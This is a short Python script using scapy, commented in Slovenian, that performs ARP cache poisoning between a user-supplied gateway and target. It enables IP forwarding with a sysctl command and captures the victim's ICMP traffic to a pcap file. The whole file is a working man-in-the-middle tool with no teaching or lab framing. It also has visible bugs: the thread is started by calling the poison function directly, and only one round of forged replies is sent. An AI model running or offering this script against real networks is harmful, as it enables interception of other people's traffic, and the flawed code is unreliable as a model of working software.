import threading

from scapy.all import *
# Vpisi parametre
from scapy.layers.l2 import ARP

gateway = raw_input("Vpisi IP gateway-ja ")
tarca = raw_input("Vpisi IP tarce ")
#Interface na katerem bomo zagnali
conf.iface = "wlp7s0"
#Glede na vpisan IP naslov tarce pridobimo mac naslov z uporabo ARP requesta
def pridobi_mac(target):
    ans= sr1(ARP(op=1, hwdst="ff:ff:ff:ff:ff:ff", pdst=target),timeout=10)

    return ans[ARP].hwsrc


gatewayMAC = pridobi_mac(gateway)
print(gatewayMAC)
tarcaMAC = pridobi_mac(tarca)
#Funkcija, ki zastruplja s pomocjo ARP
#V bistvu posljemo ARP poizvedovanje, ki nas MAC naslov nastavi kot MAC naslov gateway-ja


def poison(tarca, gatewayMAC, gateway, tarcaMAC):
    try:
        send(ARP(op=2, pdst=gateway, hwdst=gatewayMAC, psrc=tarca))
        send(ARP(op=2, pdst=tarca, hwdst=tarcaMAC, psrc=gateway))
        time.sleep(2)
    except KeyboardInterrupt:
        print("Konec zastruplanja!")

print("Zagon skripte")
#Komanda s katero omogocamo forwarding IP paketov
#sysctl -w net.ipv4.ip_forward=1
os.system("sysctl -w net.ipv4.ip_forward=1")
print("Parametri:")
print("Gateway IP in MAC" + gateway + " " + gatewayMAC)
print("Tarca IP in MAC" + tarca + " " + tarcaMAC)
print("Pricetek zastrupljanja")
poison_thread = threading.Thread(target=poison(tarca,gatewayMAC,gateway,tarcaMAC))
poison_thread.start()
packet_count = 20
try:
    print("Pricetek snifanja")
    paketi = sniff(filter="icmp", iface=conf.iface,count = packet_count)
    wrpcap("python.pcap", paketi)

except KeyboardInterrupt:
    sys.exit(0)





